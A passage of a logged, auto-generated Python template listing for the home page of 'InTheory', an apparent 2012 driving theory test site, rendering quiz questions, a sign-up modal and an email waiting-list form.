420      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:28 (via base.html:76)
421      else: _tmp = _utf8(str(_tmp))  # home.html:28 (via base.html:76)
422      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:28 (via base.html:76)
423      _append(_tmp)  # home.html:28 (via base.html:76)
424      _append('</a></li>\n<li><a class="choice" ind="1"><span class="badge badge-info">B</span> ')  # home.html:29 (via base.html:76)
425      _tmp = question.options[1]  # home.html:29 (via base.html:76)
426      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:29 (via base.html:76)
427      else: _tmp = _utf8(str(_tmp))  # home.html:29 (via base.html:76)
428      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:29 (via base.html:76)
429      _append(_tmp)  # home.html:29 (via base.html:76)
430      _append('</a></li>\n<li><a class="choice" ind="2"><span class="badge badge-info">C</span> ')  # home.html:30 (via base.html:76)
431      _tmp = question.options[2]  # home.html:30 (via base.html:76)
432      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:30 (via base.html:76)
433      else: _tmp = _utf8(str(_tmp))  # home.html:30 (via base.html:76)
434      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:30 (via base.html:76)
435      _append(_tmp)  # home.html:30 (via base.html:76)
436      _append('</a></li>\n<li><a class="choice" ind="3"><span class="badge badge-info">D</span> ')  # home.html:31 (via base.html:76)
437      _tmp = question.options[3]  # home.html:31 (via base.html:76)
438      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:31 (via base.html:76)
439      else: _tmp = _utf8(str(_tmp))  # home.html:31 (via base.html:76)
440      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:31 (via base.html:76)
441      _append(_tmp)  # home.html:31 (via base.html:76)
442      _append('</a></li>\n</ul>\n<a id="next" class="btn btn-success btn-mini disabled">Next Question</a>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class="row">\n<div class="span10">\n</div>\n<div class="span5 offset5">\n</br></br>\n<blockquote>\n<p>\n<h2><div class="funkytext"><font color="#ffffff">"')  # home.html:47 (via base.html:76)
443      _tmp = kwargs['tweet']  # home.html:47 (via base.html:76)
444      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:47 (via base.html:76)
445      else: _tmp = _utf8(str(_tmp))  # home.html:47 (via base.html:76)
446      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:47 (via base.html:76)
447      _append(_tmp)  # home.html:47 (via base.html:76)
448      _append('"</h2>\n<div class="funkytext">- Dave Mason, London</font></div>\n</p>\n</blockquote>\n</div>\n</div>\n</div> <!-- /container -->\n<div id="dim">\n</div>\n')  # home.html:57 (via base.html:76)
449      _append('\n')  # base.html:80
450      _tmp = xsrf_form_html()  # base.html:80
451      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80
452      else: _tmp = _utf8(str(_tmp))  # base.html:80
453      _append(_tmp)  # base.html:80
454      _append('\n')  # base.html:81
455      _append('\n<script src="')  # base.html:82 (via base.html:81)
456      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:82 (via base.html:81)
457      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:82 (via base.html:81)
458      else: _tmp = _utf8(str(_tmp))  # base.html:82 (via base.html:81)
459      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:82 (via base.html:81)
460      _append(_tmp)  # base.html:82 (via base.html:81)
461      _append('"></script>\n<script src="')  # base.html:83 (via base.html:81)
462      _tmp = static_url('js/libs/blurb.min.js')  # base.html:83 (via base.html:81)
463      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:83 (via base.html:81)
464      else: _tmp = _utf8(str(_tmp))  # base.html:83 (via base.html:81)
465      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:83 (via base.html:81)
466      _append(_tmp)  # base.html:83 (via base.html:81)
467      _append('"></script>\n<script src="')  # base.html:84 (via base.html:81)
468      _tmp = static_url('js/IT.js')  # base.html:84 (via base.html:81)
469      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:84 (via base.html:81)
470      else: _tmp = _utf8(str(_tmp))  # base.html:84 (via base.html:81)
471      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:84 (via base.html:81)
472      _append(_tmp)  # base.html:84 (via base.html:81)
473      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:88 (via base.html:81)
474      _append('\n')  # base.html:90
475      for js in kwargs['js_deps']:  # base.html:90
476          _append('\n<script src="')  # base.html:91
477          _tmp = static_url(js)  # base.html:91
478          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:91
479          else: _tmp = _utf8(str(_tmp))  # base.html:91
480          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:91
481          _append(_tmp)  # base.html:91
482          _append('"></script>\n')  # base.html:92
483      _append('\n')  # base.html:94
484      _append('\n<script id="signup-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<p>You still need a little practice, but don\'t worry we\'re here to help you pass. Sign-up today to get started...</p>\n<a href="/login"><center><img src="')  # home.html:68 (via base.html:94)
485      _tmp = static_url('imgs/facebook.png')  # home.html:68 (via base.html:94)
486      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:68 (via base.html:94)
487      else: _tmp = _utf8(str(_tmp))  # home.html:68 (via base.html:94)
488      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:68 (via base.html:94)
489      _append(_tmp)  # home.html:68 (via base.html:94)
490      _append('" alt="some_text"/></a>\n<img src="')  # home.html:69 (via base.html:94)
491      _tmp = static_url('imgs/twitter.png')  # home.html:69 (via base.html:94)
492      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:69 (via base.html:94)
493      else: _tmp = _utf8(str(_tmp))  # home.html:69 (via base.html:94)
494      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:69 (via base.html:94)
495      _append(_tmp)  # home.html:69 (via base.html:94)
496      _append('" alt="some_text"/>\n<img src="')  # home.html:70 (via base.html:94)
497      _tmp = static_url('imgs/google.png')  # home.html:70 (via base.html:94)
498      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:70 (via base.html:94)
499      else: _tmp = _utf8(str(_tmp))  # home.html:70 (via base.html:94)
500      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:70 (via base.html:94)
501      _append(_tmp)  # home.html:70 (via base.html:94)
502      _append('" alt="some_text"/></center>\n<center><a href="h">Or click here to sign-up directly</a></center>\n</div>\n<div class="modal-footer">\n<ul class="pager">\n<li class="previous"><a href="#">Sign in to InTheory</a></li>\n<li class="next"><a href="#">Forgot username or password?</a></li>\n</ul>\n</div>\n</div>\n</script>\n<script id="show-arrow-template" type="text/x-jquery-tmpl">\n<div class="arrow-container">\n<img src="')  # home.html:84 (via base.html:94)
503      _tmp = static_url('imgs/arrow.png')  # home.html:84 (via base.html:94)
504      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:84 (via base.html:94)
505      else: _tmp = _utf8(str(_tmp))  # home.html:84 (via base.html:94)
506      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:84 (via base.html:94)
507      _append(_tmp)  # home.html:84 (via base.html:94)
508      _append('"/>\n</div>\n</script>\n<script id="email-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<center>\n<p>Leave your email and we\'ll let you know when we launch!</p>\n<form method="post" class="af-form-wrapper" action="http://www.aweber.com/scripts/addlead.pl" >\n<div style="display: none;">\n<input type="hidden" name="meta_web_form_id" value="677441365" />\n<input type="hidden" name="meta_split_id" value="" />\n<input type="hidden" name="listname" value="intheory" />\n<input type="hidden" name="redirect" value="http://www.aweber.com/thankyou-coi.htm?m=video" id="redirect_b3be9783c304109a8d9d9ca013e7b651" />\n<input type="hidden" name="meta_adtracking" value="Waiting_List_/_Splash" />\n<input type="hidden" name="meta_message" value="1" />\n<input type="hidden" name="meta_required" value="name,email" />\n<input type="hidden" name="meta_tooltip" value="" />\n</div>\n<div id="af-form-677441365" class="af-form"><div id="af-body-677441365" class="af-body af-standards">\n<div class="af-element">\n<div class="af-textWrap"></br>\n<input id="awf_field-39151245" type="text" name="name" class="text" placeholder="Enter Your Name" tabindex="500" />\n</div>\n<div class="af-clear"></div></div>\n<div class="af-element">\n<div class="af-textWrap"><input class="text" id="awf_field-39151246" type="text" name="email" placeholder="Enter Your Email" tabindex="501" />\n</div><div class="af-clear"></div>\n</div>\n<input name="submit" class="btn btn-primaryw" type="submit" value="Submit" tabindex="502" />\n</br>\n<a href="/login">or connect with Facebook</a>\n</div>\n</br></br>\n<div class="af-element privacyPolicy" style="text-align: center"><p>We respect your <a title="Privacy Policy" href="http://www.aweber.com/permission.htm" target="_blank">email privacy</a></p>\n<div class="af-clear"></div>\n</div>\n</div>\n</div>\n<div style="display: none;"><img src="http://forms.aweber.com/form/displays.htm?id=bOzsLCyMzGys" alt="" /></div>\n</form>\n</center>\n<script type="text/javascript">\n<!--\n(function() {\nvar IE = /*@cc_on!@*/false;\nif (!IE) { return; }\nif (document.compatMode && document.compatMode == \'BackCompat\') {\nif (document.getElementById("af-form-677441365")) {\ndocument.getElementById("af-form-677441365").className = \'af-form af-quirksMode\';\n}\nif (document.getElementById("af-body-677441365")) {\ndocument.getElementById("af-body-677441365").className = "af-body inline af-quirksMode";\n}\nif (document.getElementById("af-header-677441365")) {\ndocument.getElementById("af-header-677441365").className = "af-header af-quirksMode";\n}\nif (document.getElementById("af-footer-677441365")) {\ndocument.getElementById("af-footer-677441365").className = "af-footer af-quirksMode";\n}\n}\n})();\n-->\n</script>\n</div>\n</div>\n</script>\n')  # home.html:158 (via base.html:94)
509      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:106
510      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:home.html code:
  1  def _execute():  # base.html:0
  2      _buffer = []  # base.html:0
  3      _append = _buffer.append  # base.html:0
  4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
  5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
  6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
  7      _tmp = static_url('css/base.css')  # base.html:25
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
  9      else: _tmp = _utf8(str(_tmp))  # base.html:25
 10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
 11      _append(_tmp)  # base.html:25
 12      _append('" />\n')  # base.html:26
 13      for css in kwargs['css_deps']:  # base.html:26
 14          _append('\n<link href="')  # base.html:27
 15          _tmp = static_url(css)  # base.html:27
 16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
 17          else: _tmp = _utf8(str(_tmp))  # base.html:27
 18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
 19          _append(_tmp)  # base.html:27
 20          _append('" rel="stylesheet">\n')  # base.html:28
 21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n</head>\n<body >\n')  # base.html:44
 22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:53 (via base.html:44)
 23      _tmp = static_url('imgs/logo.png')  # base.html:53 (via base.html:44)
 24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:53 (via base.html:44)
 25      else: _tmp = _utf8(str(_tmp))  # base.html:53 (via base.html:44)
 26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:53 (via base.html:44)
 27      _append(_tmp)  # base.html:53 (via base.html:44)
 28      _append('"></a>\n<div class="pull-right">\n')  # base.html:55 (via base.html:44)
 29      if not current_user:  # base.html:55 (via base.html:44)
 30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:57 (via base.html:44)
 31      else:  # base.html:57 (via base.html:44)
 32          _append('\n<ul class="nav nav-pills">\n')  # base.html:59 (via base.html:44)
 33          if current_user['moderator']:  # base.html:59 (via base.html:44)
 34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:61 (via base.html:44)
 35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:68 (via base.html:44)
 36          _tmp = static_url('imgs/user.png')  # base.html:68 (via base.html:44)
 37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:68 (via base.html:44)
 38          else: _tmp = _utf8(str(_tmp))  # base.html:68 (via base.html:44)
 39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:68 (via base.html:44)
 40          _append(_tmp)  # base.html:68 (via base.html:44)
 41          _append('"></a>\n')  # base.html:69 (via base.html:44)
 42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:74 (via base.html:44)
 43      _append('\n')  # base.html:76
 44      _append('\n<div class="container">\n<div class="hero-unit">\n<div class="hero-unit1">\n<div class="row-fluid">\n<div class="columnA pull-left">\n<h2>Pass your theory test.<br>Guaranteed.</h2>\n<ul>\n<li>The simplest and fastest way to pass your test.</li>\n<li>Use cool new learning techniques to help you remember the details.</li>\n<li>Don\'t pass first time? Get your money back.</li>\n</ul></br>\n<p><a id="get-started-btn" class="btn btn-block btn-success btn-large">Get Started Today</a></p>\n</div>\n<div class="columnB pull-right">\n</br>\n<div id="questions" data-questions=\n\'[{ "question":"')  # home.html:21 (via base.html:76)
 45      _tmp = kwargs["questions"][0].question  # home.html:21 (via base.html:76)
 46      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 47      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 48      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 49      _append(_tmp)  # home.html:21 (via base.html:76)
 50      _append('","options": ["')  # home.html:21 (via base.html:76)
 51      _tmp = kwargs["questions"][0].options[0]  # home.html:21 (via base.html:76)
 52      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 53      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 54      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 55      _append(_tmp)  # home.html:21 (via base.html:76)
 56      _append('", "')  # home.html:21 (via base.html:76)
 57      _tmp = kwargs["questions"][0].options[1]  # home.html:21 (via base.html:76)
 58      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 59      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 60      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 61      _append(_tmp)  # home.html:21 (via base.html:76)
 62      _append('", "')  # home.html:21 (via base.html:76)
 63      _tmp = kwargs["questions"][0].options[2]  # home.html:21 (via base.html:76)
 64      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 65      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 66      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 67      _append(_tmp)  # home.html:21 (via base.html:76)
 68      _append('", "')  # home.html:21 (via base.html:76)
 69      _tmp = kwargs["questions"][0].options[3]  # home.html:21 (via base.html:76)
 70      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 71      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 72      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 73      _append(_tmp)  # home.html:21 (via base.html:76)
 74      _append('"],"answer": ')  # home.html:21 (via base.html:76)
 75      _tmp = kwargs["questions"][0].answer  # home.html:21 (via base.html:76)
 76      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 77      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 78      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 79      _append(_tmp)  # home.html:21 (via base.html:76)
 80      _append('},{ "question":"')  # home.html:21 (via base.html:76)
 81      _tmp = kwargs["questions"][1].question  # home.html:21 (via base.html:76)
 82      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 83      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 84      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 85      _append(_tmp)  # home.html:21 (via base.html:76)
 86      _append('","options": ["')  # home.html:21 (via base.html:76)
 87      _tmp = kwargs["questions"][1].options[0]  # home.html:21 (via base.html:76)
 88      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 89      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 90      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 91      _append(_tmp)  # home.html:21 (via base.html:76)
 92      _append('", "')  # home.html:21 (via base.html:76)
 93      _tmp = kwargs["questions"][1].options[1]  # home.html:21 (via base.html:76)
 94      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 95      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 96      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 97      _append(_tmp)  # home.html:21 (via base.html:76)
 98      _append('", "')  # home.html:21 (via base.html:76)
 99      _tmp = kwargs["questions"][1].options[2]  # home.html:21 (via base.html:76)
100      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
101      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
102      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
103      _append(_tmp)  # home.html:21 (via base.html:76)
104      _append('", "')  # home.html:21 (via base.html:76)
105      _tmp = kwargs["questions"][1].options[3]  # home.html:21 (via base.html:76)
106      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
107      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
108      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
109      _append(_tmp)  # home.html:21 (via base.html:76)
110      _append('"],"answer": ')  # home.html:21 (via base.html:76)
111      _tmp = kwargs["questions"][1].answer  # home.html:21 (via base.html:76)
112      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
113      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
114      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
115      _append(_tmp)  # home.html:21 (via base.html:76)
116      _append('}, { "question":"')  # home.html:21 (via base.html:76)
117      _tmp = kwargs["questions"][2].question  # home.html:21 (via base.html:76)
118      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
119      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
120      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
121      _append(_tmp)  # home.html:21 (via base.html:76)
122      _append('","options": ["')  # home.html:21 (via base.html:76)
123      _tmp = kwargs["questions"][2].options[0]  # home.html:21 (via base.html:76)
124      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
125      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
126      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
127      _append(_tmp)  # home.html:21 (via base.html:76)
128      _append('", "')  # home.html:21 (via base.html:76)
129      _tmp = kwargs["questions"][2].options[1]  # home.html:21 (via base.html:76)
130      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
131      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
132      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
133      _append(_tmp)  # home.html:21 (via base.html:76)
134      _append('", "')  # home.html:21 (via base.html:76)
135      _tmp = kwargs["questions"][2].options[2]  # home.html:21 (via base.html:76)
136      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
137      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
138      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
139      _append(_tmp)  # home.html:21 (via base.html:76)
140      _append('", "')  # home.html:21 (via base.html:76)
141      _tmp = kwargs["questions"][2].options[3]  # home.html:21 (via base.html:76)
142      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
143      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
144      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
145      _append(_tmp)  # home.html:21 (via base.html:76)
146      _append('"],"answer": ')  # home.html:21 (via base.html:76)
147      _tmp = kwargs["questions"][2].answer  # home.html:21 (via base.html:76)
148      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
149      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
150      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
151      _append(_tmp)  # home.html:21 (via base.html:76)
152      _append('},{ "question":"')  # home.html:21 (via base.html:76)
153      _tmp = kwargs["questions"][3].question  # home.html:21 (via base.html:76)
154      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
155      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
156      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
157      _append(_tmp)  # home.html:21 (via base.html:76)
158      _append('","options": ["')  # home.html:21 (via base.html:76)
159      _tmp = kwargs["questions"][3].options[0]  # home.html:21 (via base.html:76)
160      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
161      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
162      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
163      _append(_tmp)  # home.html:21 (via base.html:76)
164      _append('", "')  # home.html:21 (via base.html:76)
165      _tmp = kwargs["questions"][3].options[1]  # home.html:21 (via base.html:76)
166      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
167      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
168      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
169      _append(_tmp)  # home.html:21 (via base.html:76)
170      _append('", "')  # home.html:21 (via base.html:76)
171      _tmp = kwargs["questions"][3].options[2]  # home.html:21 (via base.html:76)
172      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
173      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
174      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
175      _append(_tmp)  # home.html:21 (via base.html:76)
176      _append('", "')  # home.html:21 (via base.html:76)
177      _tmp = kwargs["questions"][3].options[3]  # home.html:21 (via base.html:76)
178      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
179      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
180      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
181      _append(_tmp)  # home.html:21 (via base.html:76)
182      _append('"],"answer": ')  # home.html:21 (via base.html:76)
183      _tmp = kwargs["questions"][3].answer  # home.html:21 (via base.html:76)
184      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
185      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
186      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
187      _append(_tmp)  # home.html:21 (via base.html:76)
188      _append('}, { "question":"')  # home.html:21 (via base.html:76)
189      _tmp = kwargs["questions"][4].question  # home.html:21 (via base.html:76)
190      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
191      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
192      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
193      _append(_tmp)  # home.html:21 (via base.html:76)
194      _append('","options": ["')  # home.html:21 (via base.html:76)
195      _tmp = kwargs["questions"][4].options[0]  # home.html:21 (via base.html:76)
196      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
197      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
198      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
199      _append(_tmp)  # home.html:21 (via base.html:76)
200      _append('", "')  # home.html:21 (via base.html:76)
201      _tmp = kwargs["questions"][4].options[1]  # home.html:21 (via base.html:76)
202      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
203      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
204      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
205      _append(_tmp)  # home.html:21 (via base.html:76)
206      _append('", "')  # home.html:21 (via base.html:76)
207      _tmp = kwargs["questions"][4].options[2]  # home.html:21 (via base.html:76)
208      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
209      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
210      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
211      _append(_tmp)  # home.html:21 (via base.html:76)
212      _append('", "')  # home.html:21 (via base.html:76)
213      _tmp = kwargs["questions"][4].options[3]  # home.html:21 (via base.html:76)
214      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
215      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
216      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
217      _append(_tmp)  # home.html:21 (via base.html:76)
218      _append('"],"answer": ')  # home.html:21 (via base.html:76)
219      _tmp = kwargs["questions"][4].answer  # home.html:21 (via base.html:76)
220      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
221      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
222      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
223      _append(_tmp)  # home.html:21 (via base.html:76)
224      _append('},{ "question":"')  # home.html:21 (via base.html:76)
225      _tmp = kwargs["questions"][5].question  # home.html:21 (via base.html:76)
226      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
227      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
228      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
229      _append(_tmp)  # home.html:21 (via base.html:76)
230      _append('","options": ["')  # home.html:21 (via base.html:76)
